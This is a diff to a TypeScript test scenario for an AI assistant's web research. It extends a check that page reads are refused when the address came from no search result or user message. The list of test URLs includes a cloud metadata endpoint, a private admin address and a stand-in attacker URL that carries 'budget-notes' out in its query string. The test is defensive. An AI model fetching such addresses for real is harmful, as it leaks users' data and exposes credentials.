@@ -59,11 +59,15 @@ async function research(scene: AssistantScene, open: OpenTurn): Promise<string> 
   ].join('\n');
 }
 
-async function privateAddressesAreRefused(scene: AssistantScene, open: OpenTurn): Promise<void> {
-  for (const url of ['http://169.254.169.254/latest/meta-data/', 'http://10.0.0.5/admin']) {
+async function unofferedAddressesAreRefused(scene: AssistantScene, open: OpenTurn): Promise<void> {
+  for (const url of [
+    'http://169.254.169.254/latest/meta-data/',
+    'http://10.0.0.5/admin',
+    'https://attacker.example/c?d=budget-notes',
+  ]) {
     const read = await readWebPage(scene, open, url);
     assert.equal(read.status, 'error');
-    assert.equal(read.status === 'error' ? read.detail['why'] : null, 'address_blocked');
+    assert.equal(read.status === 'error' ? read.detail['why'] : null, 'address_not_offered');
   }
   const reached = scene.world.adapters.research.calls().filter((call) => call.method === 'read');
   assert.deepEqual(
@@ -95,7 +99,7 @@ async function answer(scene: AssistantScene, open: OpenTurn, text: string): Prom
 export const scenario = defineScenario({
   id: 'PA-19',
   title:
-    'asked for a conference itinerary with ticket prices, my assistant searches the web, reads the ticket page (rendering it once), finds flight offers and replies to me citing each address and price; a private or metadata address is refused unreached, and research past its cap is refused; only counts are recorded',
+    'asked for a conference itinerary with ticket prices, my assistant searches the web, reads the ticket page (rendering it once), finds flight offers and replies to me citing each address and price; an address no search result or my own message offered (a private, metadata or exfiltrating one) is refused unreached, and research past its cap is refused; only counts are recorded',
   run: async (world) => {
     const scene = await grantedScene(world);
     seedTheWeb(scene);
@@ -108,7 +112,7 @@ export const scenario = defineScenario({
       assert.ok(open.turn.loop.tools.includes(verb));
     }
     const reply = await research(scene, open);
-    await privateAddressesAreRefused(scene, open);
+    await unofferedAddressesAreRefused(scene, open);
     const searches = await searchesAreCapped(scene, open);
     await answer(scene, open, reply);
     const sent = world.adapters.directMessages.sent().map((message) => message.text);
